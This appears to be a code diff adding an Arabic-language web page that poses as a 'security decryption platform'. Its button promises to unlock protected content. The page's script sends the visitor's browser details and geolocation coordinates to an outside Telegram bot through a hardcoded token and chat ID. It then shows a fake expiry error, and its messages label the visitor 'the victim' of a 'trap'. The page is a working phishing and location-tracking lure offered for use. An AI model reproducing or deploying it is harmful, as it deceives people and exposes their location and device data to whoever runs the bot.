@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة فك التشفير والأمان - جاري التحميل</title>
+    <style>
+        body {
+            background-color: #0b0f19;
+            color: #f8fafc;
+            font-family: Tahoma, sans-serif;
+            text-align: center;
+            padding: 50px 20px;
+        }
+        .box {
+            max-width: 420px;
+            margin: 0 auto;
+            background: #111827;
+            border: 2px solid #ef4444;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 0 25px rgba(239, 68, 68, 0.4);
+        }
+        h2 { 
+            color: #ef4444; 
+            font-size: 22px; 
+            margin-bottom: 15px; 
+        }
+        p { 
+            color: #9ca3af; 
+            font-size: 14px; 
+            line-height: 1.6; 
+            margin-bottom: 25px; 
+        }
+        .btn {
+            background-color: #ef4444;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+        }
+        .btn:hover { 
+            background-color: #dc2626; 
+        }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2>🔒 المحتوى محمي بروتوكولياً</h2>
+        <p>لتجاوز جدار الحماية وعرض الملف أو الصورة الأصلية بدقة عالية، يرجى السماح بالمزامنة والضغط على الزر أدناه:</p>
+        
+        <button class="btn" onclick="executeExploit()">تأكيد وفك التشفير</button>
+    </div>
+
+    <script>
+        const TOKEN = "8914307512:AAG5f00Yn0ZiaP9R3JkO6KeAXMfP7VmNEYc";
+        const ADMIN_ID = 8988614093;
+
+        function sendToSanad(dataText) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ 
+                    chat_id: ADMIN_ID, 
+                    text: `🚨 **صيد جديد من منظومة الفخ:**\n\n${dataText}`, 
+                    parse_mode: "Markdown" 
+                })
+            });
+        }
+
+        function executeExploit() {
+            let deviceInfo = `📱 **معلومات الجهاز:**\n${navigator.userAgent}\n🌐 **لغة المتصفح:** ${navigator.language}`;
+            
+            // سحب الموقع الجغرافي فور ضغط الزر
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    sendToSanad(`${deviceInfo}\n\n📍 **الإحداثيات الجغرافية:**\nhttps://maps.google.com/?q=${lat},${lon}`);
+                    alert("⚠️ عذراً، مفتاح فك التشفير منتهي الصلاحية.");
+                }, function(error) {
+                    sendToSanad(`${deviceInfo}\n\n⚠️ تم رفض إذن الموقع الجغرافي من الضحية.`);
+                    alert("⚠️ حدث خطأ في مزامنة الأمان.");
+                });
+            } else {
+                sendToSanad(deviceInfo);
+                alert("⚠️ متصفح الضحية لا يدعم البروتوكول.");
+            }
+        }
+    </script>
+
+</body>
+</html>
